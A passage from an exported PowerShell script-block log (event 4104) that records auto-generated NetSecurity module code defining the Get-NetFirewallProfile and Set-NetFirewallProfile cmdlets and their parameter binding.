          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecUnauthPerIPRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecUnauthPerIPRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    

ScriptBlock ID: 641bc2d7-07d8-4b2d-b3f4-ec7978cbe7dc
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetSecDeltaCollection'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                


ScriptBlock ID: e118cc52-19cf-44d5-9abb-ee6b54cbf2e5
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (2 of 2):
ameters.ContainsKey('DefaultOutboundAction')) {
            [object]$__cmdletization_value = ${DefaultOutboundAction}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultOutboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultOutboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('AllowInboundRules')) {
            [object]$__cmdletization_value = ${AllowInboundRules}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowInboundRules'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowInboundRules'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('AllowLocalFirewallRules')) {
            [object]$__cmdletization_value = ${AllowLocalFirewallRules}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowLocalFirewallRules'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowLocalFirewallRules'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('AllowLocalIPsecRules')) {
            [object]$__cmdletization_value = ${AllowLocalIPsecRules}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowLocalIPsecRules'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowLocalIPsecRules'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('AllowUserApps')) {
            [object]$__cmdletization_value = ${AllowUserApps}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowUserApps'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowUserApps'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('AllowUserPorts')) {
            [object]$__cmdletization_value = ${AllowUserPorts}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowUserPorts'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowUserPorts'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('AllowUnicastResponseToMulticast')) {
            [object]$__cmdletization_value = ${AllowUnicastResponseToMulticast}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowUnicastResponseToMulticast'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowUnicastResponseToMulticast'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NotifyOnListen')) {
            [object]$__cmdletization_value = ${NotifyOnListen}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NotifyOnListen'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NotifyOnListen'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('EnableStealthModeForIPsec')) {
            [object]$__cmdletization_value = ${EnableStealthModeForIPsec}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableStealthModeForIPsec'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableStealthModeForIPsec'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LogFileName')) {
            [object]$__cmdletization_value = ${LogFileName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LogFileName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LogFileName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LogMaxSizeKilobytes')) {
            [object]$__cmdletization_value = ${LogMaxSizeKilobytes}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LogMaxSizeKilobytes'; ParameterType = 'System.UInt64'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LogMaxSizeKilobytes'; ParameterType = 'System.UInt64'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LogAllowed')) {
            [object]$__cmdletization_value = ${LogAllowed}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LogAllowed'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LogAllowed'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LogBlocked')) {
            [object]$__cmdletization_value = ${LogBlocked}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LogBlocked'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LogBlocked'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LogIgnored')) {
            [object]$__cmdletization_value = ${LogIgnored}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LogIgnored'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LogIgnored'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('DisabledInterfaceAliases')) {
            [object]$__cmdletization_value = ${DisabledInterfaceAliases}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisabledInterfaceAliases'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisabledInterfaceAliases'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallProfile.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetFirewallProfile' -Alias '*'
        


ScriptBlock ID: 4378949f-bc6c-45cd-8146-7e937d683352
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 2):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetFirewallProfile'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-NetFirewallProfile
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('Profile')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallRule},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallRule') -and (@('ByAssociatedNetFirewallRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallRule}, 'MSFT_NetFirewallRuleInProfile', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleInProfile', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeRule') -and (@('ByAssociatedNetIPsecMainModeRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeRule}, 'MSFT_NetMainModeRuleInProfile', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByAssociatedNetFirewallRule', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByAssociatedNetFirewallRule', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallProfile.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetFirewallProfile' -Alias '*'
        

function Set-NetFirewallProfile
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('Profile')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${Enabled},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action]
    ${DefaultInboundAction},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action]
    ${DefaultOutboundAction},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${AllowInboundRules},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${AllowLocalFirewallRules},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${AllowLocalIPsecRules},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${AllowUserApps},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${AllowUserPorts},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${AllowUnicastResponseToMulticast},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${NotifyOnListen},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${EnableStealthModeForIPsec},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${LogFileName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint64]
    ${LogMaxSizeKilobytes},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${LogAllowed},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${LogBlocked},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${LogIgnored},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
